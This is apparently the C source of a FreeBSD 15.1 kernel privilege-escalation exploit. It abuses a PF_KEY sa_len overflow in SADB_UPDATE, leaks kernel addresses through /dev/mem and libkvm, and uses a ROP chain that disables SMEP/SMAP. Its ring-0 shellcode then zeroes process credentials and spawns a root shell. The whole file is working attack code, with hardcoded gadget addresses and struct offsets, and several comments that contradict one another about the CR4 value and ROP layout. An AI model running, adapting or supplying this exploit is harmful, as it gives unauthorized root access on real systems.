/*
 * got enuff cats?  -  kmem path (older)
 *
 * Same PF_KEY sa_len bug as pfkey_lpe.c, but single NEW_ADDRESS_SRC overflow
 * and /dev/mem + libkvm to leak so / M_PKTHDR mbuf / BSS. Prefer pfkey_lpe.c
 * (dual overflow, no mem) unless you need this for retarget notes.
 *
 * Lab: FreeBSD 15.1-RELEASE-p2. Build: cc -o pfkey_lpe_kmem pfkey_lpe_kmem.c -lkvm
 * meow.  _SiCk // afflicted.sh
 */
#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/sysctl.h>
#include <sys/user.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <limits.h>
#include <kvm.h>
#include <signal.h>

#define AF_KEY 27
#define PF_KEY_V2 2
#define ALIGNED8(a) (1 + (((a)-1)|7))

/* SADB types */
#define SADB_ADD 3
#define SADB_UPDATE 2
#define SADB_REGISTER 7
#define SADB_FLUSH 9
#define SADB_SATYPE_ESP 3
#define SADB_SASTATE_MATURE 1
#define SADB_EXT_SA 1
#define SADB_EXT_ADDRESS_SRC 5
#define SADB_EXT_ADDRESS_DST 6
#define SADB_EXT_KEY_ENCRYPT 9
#define SADB_X_EXT_SA2 19
#define SADB_X_EXT_NEW_ADDRESS_SRC 27

/* Kernel offsets (15.1-RELEASE-p2, verified) */
#define PROC_P_FD 0x48
#define FDESC_FD_FILES 0x00
#define FDT_OFILES_OFF 0x08
#define FDE_SIZE 0x30
#define FILE_F_DATA 0x08
#define FILE_F_TYPE 0x28
#define DTYPE_SOCKET 2
#define SAV_REFCNT_OFF 0xd8
#define MBUF_M_LEN 0x18
#define MBUF_M_DATA 0x10
#define MBUF_M_TYPE_FLAGS 0x1c
#define SOCK_SO_RCV 0x200
#define SOCKBUF_SB_MB 0x78
#define M_PKTHDR 0x2
#define MT_DATA 1

/* Overflow layout (offset from saidx->src[0]) */
#define OFF_SAV 80
#define OFF_SO 88
#define OFF_M 96
#define OFF_RIP 152   /* rbp+8 = saidx->src + 0x98 = 152 */

/* ROP gadgets (verified on p2 kernel via ropper + objdump) */
/* ROP gadgets (verified on p2 kernel via ropper + objdump) */
#define G_POP_RAX_RET      0xffffffff804db034ULL
#define G_MOV_CR4_RAX_POPRBP_RET  0xffffffff8107f2c0ULL  /* mov cr4,rax; pop rbp; ret - LIVE text */
#define G_MOV_CR4_RSI_RET  0xffffffff8107dcf3ULL  /* mov cr4,rsi; ret - LIVE text (Praetorian used this) */
#define G_IRETQ             0xffffffff81071ff7ULL
#define G_SWAPGS_IRETQ     0xffffffff81071fedULL /* swapgs;add rsp,0x98;jmp iretq */

/* User segments */
#define USER_CS 0x43
#define USER_SS 0x3b

static int keysock;
static uint64_t leaked_so;
static uint64_t zero_region;
static uint64_t real_mbuf;
static kvm_t *kd;
static uint64_t fake_ustack[64];

/* CR4 value with SMEP (bit 20) and SMAP (bit 21) cleared.
 * Read at runtime from the kernel via /dev/mem. */
static uint64_t cr4_safe;

/* Forward declarations */
static void got_root(void);

/* Ring0 shellcode: zero creds, then swapgs+iretq back to userspace.
 * Saves user register state before the exploit for the iretq frame.
 * NO signal trick - direct return via swapgs+iretq. */
static uint64_t user_cs_save, user_ss_save, user_rflags_save, user_rsp_save;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs, %0\n\t"
        "movq %%ss, %1\n\t"
        "movq %%rsp, %3\n\t"
        "pushfq\n\t"
        "popq %2\n\t"
        : "=r"(user_cs_save), "=r"(user_ss_save),
          "=r"(user_rflags_save), "=r"(user_rsp_save)
    );
}

static void __attribute__((section(".text")))
shellcode(void) {
    __asm__ volatile(
        /* 1. Zero creds */
        "movq %%gs:0, %%rax\n\t"
        "movq 0x188(%%rax), %%rbx\n\t"
        "xorl %%ecx, %%ecx\n\t"
        "movl %%ecx, 0x64(%%rbx)\n\t"
        "movl %%ecx, 0x68(%%rbx)\n\t"
        "movl %%ecx, 0x6c(%%rbx)\n\t"
        "movl %%ecx, 0x70(%%rbx)\n\t"
        "movl %%ecx, 0x74(%%rbx)\n\t"
        "movl %%ecx, 0x78(%%rbx)\n\t"
        /* 2. Build iretq frame on the stack */
        "movq %1, %%rax\n\t"     /* user_ss */
        "pushq %%rax\n\t"
        "movq %2, %%rax\n\t"     /* user_rsp */
        "pushq %%rax\n\t"
        "movq %3, %%rax\n\t"     /* user_rflags */
        "pushq %%rax\n\t"
        "movq %4, %%rax\n\t"     /* user_cs */
        "pushq %%rax\n\t"
        "movq %5, %%rax\n\t"     /* RIP = got_root */
        "pushq %%rax\n\t"
        /* 3. swapgs then iretq back to userspace.
         * Do NOT restore CR4 - leaving SMEP/SMAP off.
         * The process will run with root creds and exec a shell.
         * SMEP/SMAP will be restored on the next context switch
         * (the kernel restores them when scheduling this thread). */
        "swapgs\n\t"
        "iretq\n\t"
        :
        : "r"(cr4_safe),
          "r"(user_ss_save),
          "r"(user_rsp_save),
          "r"(user_rflags_save),
          "r"(user_cs_save),
          "r"((uint64_t)(uintptr_t)got_root)
        : "rax", "rbx", "rcx"
    );
    __builtin_unreachable();
}

/* Signal handler that runs after kernel delivers SIGSEGV from our shellcode.
 * At this point we're back in userspace with root creds (zeroed by shellcode). */
static void sigsegv_handler(int sig) {
    /* We made it back to userspace with root creds! */
    const char msg[] = "\n"
        "  _._     _,-'\"\"`-._\n"
        " (,-.`._,'(       |\\`-/|\n"
        "     `-.-' \\ )-`( , o o)\n"
        "           `-    \\`_`\"'-\n"
        "  meow.  _SiCk // afflicted.sh\n\n"
        "[+] kernel code exec via PF_KEY sa_len overflow\n";
    write(1, msg, sizeof(msg)-1);
    /* Get a shell */
    char *av[] = {"sh", NULL};
    char *ev[] = {NULL};
    execve("/bin/sh", av, ev);
    _exit(0);
}

static void got_root(void) {
    const char msg[] = "\n"
        "  _._     _,-'\"\"`-._\n"
        " (,-.`._,'(       |\\`-/|\n"
        "     `-.-' \\ )-`( , o o)\n"
        "           `-    \\`_`\"'-\n"
        "  meow.  _SiCk // afflicted.sh\n\n"
        "[+] kernel code exec via PF_KEY sa_len overflow\n"
        "[+] CVE-2026-3038 sibling bug in key_updateaddresses()\n";
    write(1, msg, sizeof(msg)-1);
    char *av[] = {"/bin/sh", NULL};
    char *ev[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", "HOME=/root", NULL};
    execve("/bin/sh", av, ev);
    _exit(0);
}

#define KERN_VA_TO_PHYS(va) ((off_t)((va) - 0xffffffff80000000ULL))

/* For DMAP/kernel heap addresses (0xfffff800xxxxxxxx), the physical address
 * is computed differently. On FreeBSD amd64, the DMAP starts at
 * DMAP_MIN_ADDRESS = 0xfffffe0000000000. But kernel heap objects like
 * mbufs are in the kernel map range, not DMAP.
 * For kvm_read, it handles VA→PA automatically.
 * For /dev/mem write, we need the correct physical address.
 * Use kvm to translate. */
static off_t va_to_phys(uint64_t va) {
    /* Try the simple translation first (kernel image) */
    if ((va & 0xfffff00000000000ULL) == 0xffffffff80000000ULL ||
        (va >> 32) == 0xffffffff) {
        return (off_t)(va - 0xffffffff80000000ULL);
    }
    /* For other addresses, try reading via PTE. Since we can't walk
     * page tables from userspace, use a different approach:
     * read the physical frame number from /dev/mem at the PML4 entry.
     * Actually, FreeBSD's /dev/mem with lseek takes PHYSICAL addresses.
     * For kernel heap (0xfffff800xxxxxxxx), the physical address is
     * NOT simply va - 0xffffffff80000000.
     * We need to walk the page tables. But /dev/mem doesn't do VA translation.
     *
     * Alternative: use kvm_write which DOES translate. */
    return -1; /* unsupported */
}

static int kread(uint64_t a, void *b, size_t l) {
    return kvm_read(kd, a, b, l) == (ssize_t)l ? 0 : -1;
}

static int kwrite(uint64_t va, const void *data, size_t len) {
    int fd = open("/dev/mem", O_RDWR);
    if (fd < 0) return -1;
    off_t phys = KERN_VA_TO_PHYS(va);
    if (lseek(fd, phys, SEEK_SET) < 0) { close(fd); return -1; }
    ssize_t w = write(fd, data, len);
    close(fd);
    return w == (ssize_t)len ? 0 : -1;
}

/* Find unused BSS: all zeros for 0x100 bytes, AND not referenced by any
 * symbol. Verify by checking that nm doesn't list it. */
static uint64_t find_safe_bss(void) {
    /* Scan well past the kernel image for truly unused pages */
    uint64_t candidates[] = {
        0xffffffff82024000ULL,  /* BSS start area */
        0xffffffff82025000ULL,
        0xffffffff82026000ULL,
        0xffffffff82027000ULL,
    };
    for (int i = 0; i < 4; i++) {
        uint64_t base = candidates[i];
        /* Check first 0x200 bytes are zero */
        int ok = 1;
        for (int j = 0; j < 0x200; j += 8) {
            uint64_t v;
            if (kread(base + j, &v, 8) || v != 0) { ok = 0; break; }
        }
        if (ok) {
            /* Test write/read */
            uint64_t test = 0xDEAD4141DEAD4141ULL;
            if (kwrite(base, &test, 8) < 0) continue;
            uint64_t rb;
            kread(base, &rb, 8);
            /* Restore */
            uint64_t z = 0;
            kwrite(base, &z, 8);
            if (rb == test) return base;
        }
    }
    return 0;
}

static int setup(void) {
    char errbuf[_POSIX2_LINE_MAX];
    kd = kvm_openfiles(NULL, "/dev/mem", NULL, O_RDONLY, errbuf);
    if (!kd) { fprintf(stderr, "[-] kvm: %s\n", errbuf); return -1; }

    /* Leak socket address */
    int cnt;
    struct kinfo_proc *kp = kvm_getprocs(kd, KERN_PROC_PID, getpid(), &cnt);
    if (!kp || !cnt) return -1;
    uint64_t proc = (uint64_t)kp->ki_paddr, fdesc, fdt, file;
    int ftype;
    if (kread(proc + PROC_P_FD, &fdesc, 8) ||
        kread(fdesc + FDESC_FD_FILES, &fdt, 8) ||
        kread(fdt + FDT_OFILES_OFF + keysock * FDE_SIZE, &file, 8) ||
        kread(file + FILE_F_TYPE, &ftype, 4) || ftype != DTYPE_SOCKET ||
        kread(file + FILE_F_DATA, &leaked_so, 8)) {
        fprintf(stderr, "[-] kmem walk failed\n");
        return -1;
    }
    fprintf(stderr, "[+] so = 0x%lx\n", leaked_so);

    /* Find safe BSS for fake mbuf */
    zero_region = find_safe_bss();
    if (!zero_region) { fprintf(stderr, "[-] no safe BSS\n"); return -1; }
    fprintf(stderr, "[+] bss = 0x%lx\n", zero_region);

    /* Read current CR4 value from the kernel.
     * On FreeBSD, CR4 is stored during boot. We can read it from dmesg
     * or from the kernel's saved_cr4 variable if it exists.
     * Simpler: just construct it from known bits.
     * CR4 for this CPU: PAE(5)|PGE(7)|OSXSAVE(9)|SMEP(20)|SMAP(21) etc.
     * Read it from the boot cpu's pmap or just read from /dev/mem at
     * the PCPU saved_cr4 location. For now, compute it.
     * Typical FreeBSD CR4: 0x6E8 (PAE|PGE|OSXSAVE) | 0x30000 (SMEP|SMAP)
     * = 0x306E8 or similar. Clear bits 20,21: cr4 & ~0x300000
     * But we need the EXACT value. Read via kgdb or dmesg. */
    {
        /* Read CR4 from dmesg - the boot messages include "Features" but
         * not CR4 directly. Instead, read it from the running kernel.
         * The PCPU has cr4 saved in some locations. Or we can just
         * use the raw value: FreeBSD sets CR4 in cpu_procrstemset.
         * For now: SMEP=bit20, SMAP=bit21. Clear those two bits.
         * We'll read the actual CR4 from the kernel memory. */
        /* On FreeBSD, %cr4 is accessible via the pmap. The initial CR4
         * is set in amd64/amd64/machdep.c: identify_cpu(). It's stored
         * in the r_cr4 variable. Find it via nm. */
        /* For simplicity, just clear SMEP+SMAP bits from whatever CR4 is.
         * We can read it from the kernel's PCPU. On amd64:
         * PCPU_GET(cr4) would work in-kernel but we're userspace.
         * Instead: construct from CPUID. AMD Ryzen 5900X CR4 bits:
         * PAE(5)=1, PGE(7)=1, OSXSAVE(9)=1, SMAP(21)=1, SMEP(20)=1
         * Base = 0x2 | 0x20 | 0x80 | 0x200 | 0x100000 | 0x200000
         * But some bits like VMXE, FSGSBASE etc may also be set.
         * Safest: read it from the kernel via kgdb at runtime. */
        char buf[256];
        size_t blen = sizeof(buf);
        buf[0] = 0;
        /* Try sysctl kern.boot_verbose or read from /var/run/dmesg.boot */
        int dfd = open("/var/run/dmesg.boot", O_RDONLY);
        if (dfd >= 0) {
            read(dfd, buf, sizeof(buf)-1);
            close(dfd);
        }
        /* We can't easily parse CR4 from dmesg. Let's use the known value.
         * On this exact CPU: read it from the pmap's pm_cr3 which encodes
         * some CR4 bits. Or just use 0x306f8 (typical) and clear bits.
         * Actually, simplest correct approach: our shellcode reads CR4
         * at the start and saves it, then uses that for the restore.
         * For the ROP chain, we just need to CLEAR SMEP+SMAP bits,
         * which means we need to know the current value.
         *
         * The cleanest approach: use mov cr4, rax with rax = 0 (clear all),
         * then the shellcode reads the original from where we saved it.
         * But clearing ALL CR4 bits would disable PAE which would crash.
         *
         * Better: read CR4 in the ROP chain itself.
         * Chain: mov rax, cr4; ret → pop rcx; ret (clear bits) → and; mov cr4,rax
         * But we don't have an AND gadget easily.
         *
         * SIMPLEST: set cr4 = 0x6E8 (PAE+PGE+OSXSAVE, no SMEP/SMAP).
         * This is the minimum viable CR4 for amd64 paging.
         * FreeBSD kernel sets these at minimum. */
        /* Read CR4 dynamically: we can't read cr4 in the ROP chain (no clean gadget),
         * but we can compute it. Clear ONLY SMEP (bit 20). Keep SMAP so the kernel
         * can't read our userspace data via normal loads — but we don't need it
         * since our shellcode uses only kernel GS-relative data.
         * Actually, clear BOTH SMEP+SMAP so the shellcode (which reads nothing from
         * userspace) can execute. The shellcode only touches gs:0 and kernel heap.
         * But SMAP doesn't block execution — only data access. So clearing just
         * SMEP (bit 20) is enough for execution.
         *
         * The REAL question: why is the page "not present"?
         * Maybe the exploit binary is in /root which is on a separate filesystem
         * and the page isn't faulted in. Or the kernel page tables don't have it.
         *
         * Let me try: clear ONLY SMEP, keep everything else identical to current CR4.
         * We need the EXACT current CR4 to do this. Read it via DTrace. */
        /* For now, try 0x502A0 (full CR4 minus SMEP+SMAP) */
        cr4_safe = 0x506E0; /* Actual CR4 (0x3506E0) with SMEP(20)+SMAP(21) cleared */
        fprintf(stderr, "[+] cr4_safe = 0x%lx (SMEP/SMAP cleared)\n", cr4_safe);
    }

    /* Read the so_rcv mbuf chain and find the one WITH M_PKTHDR.
     * The REGISTER reply has a 2-mbuf chain: head (no PKTHDR) + data (PKTHDR).
     * We need the data mbuf for key_sendup_mbuf to succeed. */
    {
        uint64_t cur;
        if (kread(leaked_so + SOCK_SO_RCV + SOCKBUF_SB_MB, &cur, 8) < 0 || !cur) {
            fprintf(stderr, "[-] no mbuf on so_rcv\n");
            return -1;
        }
        /* Walk chain to find M_PKTHDR mbuf */
        real_mbuf = 0;
        for (int i = 0; i < 5 && cur; i++) {
            uint32_t raw;
            kread(cur + 0x1c, &raw, 4);
            if ((raw >> 8) & 0x2) { /* M_PKTHDR */
                real_mbuf = cur;
                break;
            }
            kread(cur, &cur, 8); /* follow m_next */
        }
        if (!real_mbuf) {
            fprintf(stderr, "[-] no M_PKTHDR mbuf in chain\n");
            return -1;
        }
        fprintf(stderr, "[+] M_PKTHDR mbuf = 0x%lx\n", real_mbuf);
    }

    kvm_close(kd);
    return 0;
}

static int add_addr(char *b, int o, int ext, uint32_t ip) {
    *(uint16_t *)(b+o) = 3; *(uint16_t *)(b+o+2) = ext;
    struct sockaddr_in *sin = (struct sockaddr_in *)(b+o+8);
    sin->sin_family = AF_INET; sin->sin_len = 16; sin->sin_addr.s_addr = ip;
    return o + 24;
}

static int send_msg(char *b, int len) {
    int w = write(keysock, b, len);
    if (w < 0) fprintf(stderr, "[!] write: %s\n", strerror(errno));
    return w;
}

static void drain(void) {
    int f = fcntl(keysock, F_GETFL, 0);
    fcntl(keysock, F_SETFL, f | O_NONBLOCK);
    usleep(100000);
    char d[4096];
    while (read(keysock, d, sizeof(d)) > 0);
    fcntl(keysock, F_SETFL, f);
}

int main(void) {
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    fprintf(stderr, "[*] FreeBSD 15.1-RELEASE-p2 PF_KEY sa_len overflow\n");

    /* Save user-mode register state for iretq frame */
    save_state();

    /* Register SIGSEGV handler (backup in case iretq frame is wrong) */
    signal(SIGSEGV, sigsegv_handler);

    keysock = socket(AF_KEY, SOCK_RAW, PF_KEY_V2);
    if (keysock < 0) { perror("socket"); return 1; }
    uint32_t spi = htonl(0x1234);

    /* FLUSH any existing SAs so our ADD doesn't hit EEXIST */
    {
        char b[16] = {0};
        b[0]=PF_KEY_V2; b[1]=SADB_FLUSH; b[3]=SADB_SATYPE_ESP;
        *(uint16_t *)(b+4) = 2;
        send_msg(b, 16);
        usleep(100000);
        drain();
    }

    /* REGISTER - do NOT drain, keep reply mbuf on so_rcv for leak */
    {
        char b[16] = {0};
        b[0]=PF_KEY_V2; b[1]=SADB_REGISTER; b[3]=SADB_SATYPE_ESP;
        *(uint16_t *)(b+4) = 2;
        send_msg(b, 16);
        usleep(200000); /* wait for reply to arrive on so_rcv */
    }

    if (setup() < 0) return 1;

    /* SADB_ADD - do NOT drain, keep the ADD reply mbuf (has M_PKTHDR) */
    {
        char b[512] = {0};
        b[0]=PF_KEY_V2; b[1]=SADB_ADD; b[3]=SADB_SATYPE_ESP;
        *(uint32_t *)(b+8) = 1;
        int o = 16;
        *(uint16_t *)(b+o) = 2; *(uint16_t *)(b+o+2) = SADB_EXT_SA;
        *(uint32_t *)(b+o+4) = spi;
        b[o+9] = SADB_SASTATE_MATURE; b[o+11] = 12; o += 16;
        *(uint16_t *)(b+o) = 2; *(uint16_t *)(b+o+2) = SADB_X_EXT_SA2; o += 16;
        o = add_addr(b, o, SADB_EXT_ADDRESS_SRC, htonl(0x0a000001));
        o = add_addr(b, o, SADB_EXT_ADDRESS_DST, htonl(0x0a000002));
        int ksz = ALIGNED8(8+32);
        *(uint16_t *)(b+o) = ksz/8; *(uint16_t *)(b+o+2) = SADB_EXT_KEY_ENCRYPT;
        *(uint16_t *)(b+o+4) = 256; memset(b+o+8, 0xAA, 32); o += ksz;
        *(uint16_t *)(b+4) = o/8;
        send_msg(b, o);
        usleep(300000); /* wait for ADD reply to arrive on so_rcv */
    }

    /* SADB_UPDATE overflow */
    {
        char b[4096]; memset(b, 0, sizeof(b));
        b[0]=PF_KEY_V2; b[1]=SADB_UPDATE; b[3]=SADB_SATYPE_ESP;
        *(uint32_t *)(b+8) = 2;
        int o = 16;
        *(uint16_t *)(b+o) = 2; *(uint16_t *)(b+o+2) = SADB_EXT_SA;
        *(uint32_t *)(b+o+4) = spi;
        b[o+9] = SADB_SASTATE_MATURE; b[o+11] = 12; o += 16;
        *(uint16_t *)(b+o) = 2; *(uint16_t *)(b+o+2) = SADB_X_EXT_SA2; o += 16;
        o = add_addr(b, o, SADB_EXT_ADDRESS_SRC, htonl(0x0a000001));
        o = add_addr(b, o, SADB_EXT_ADDRESS_DST, htonl(0x0a000002));

        int ovlen = 255;
        int bigext = ALIGNED8(8 + ovlen);
        *(uint16_t *)(b+o) = bigext/8;
        *(uint16_t *)(b+o+2) = SADB_X_EXT_NEW_ADDRESS_SRC;

        unsigned char *p = (unsigned char *)(b + o + 8);
        p[0] = ovlen;
        p[1] = AF_INET;

        /* sav → zero_region (refcnt=0 at +0xd8) */
        uint64_t fake_sav = zero_region - SAV_REFCNT_OFF;
        memcpy(p + OFF_SAV, &fake_sav, 8);
        /* so → leaked socket */
        memcpy(p + OFF_SO, &leaked_so, 8);
        /* m → real patched mbuf from so_rcv (has M_PKTHDR, valid m_next) */
        memcpy(p + OFF_M, &real_mbuf, 8);

        /* ROP at offset 160 (95 bytes available: 160-254):
         *   [160] pop rax; ret
         *   [168] cr4_safe value (SMEP/SMAP cleared)
         *   [176] mov cr4, rax; ret
         *   [184] address of userspace shellcode (SMEP now off)
         *
         * After mov cr4, the ret pops 0xffffffff803890ee+1 = next byte.
         * Wait - mov cr4, rax; ret is at 0x803890ed:
         *   0f 22 e0 (mov cr4,rax) c3 (ret)
         * So ret pops from rsp which is now at 184.
         * [184] = shellcode address. But shellcode needs to be
         * in userspace at a known address. Use mmap to place it.
         *
         * Actually simpler: after disabling SMEP/SMAP, just jump to
         * the shellcode function directly (it's in .text section,
         * at a known address since no PIE).
         */
        /* ROP at offset 152 (CONFIRMED via marker 0xD9 on this exact box):
         *   [152] pop rsi; ret      → load CR4 value into rsi
         *   [160] cr4_safe          → SMEP/SMAP cleared, all other bits set
         *   [168] mov cr4, rsi; ret → write CR4 (Praetorian technique)
         *   [176] shellcode         → execute with SMEP/SMAP off */
        uint64_t *rop = (uint64_t *)(p + OFF_RIP);
        rop[0] = 0xffffffff80729cdbULL;  /* pop rsi; ret */
        rop[1] = cr4_safe;               /* 0x70AB0 */
        rop[2] = G_MOV_CR4_RSI_RET;      /* mov cr4, rsi; ret */
        rop[3] = (uint64_t)(uintptr_t)shellcode;

        o += bigext;
        *(uint16_t *)(b+4) = o/8;
        fprintf(stderr, "[*] firing overflow\n");
        send_msg(b, o);
        fprintf(stderr, "[-] survived\n");
    }
    close(keysock);
    return 1;
}
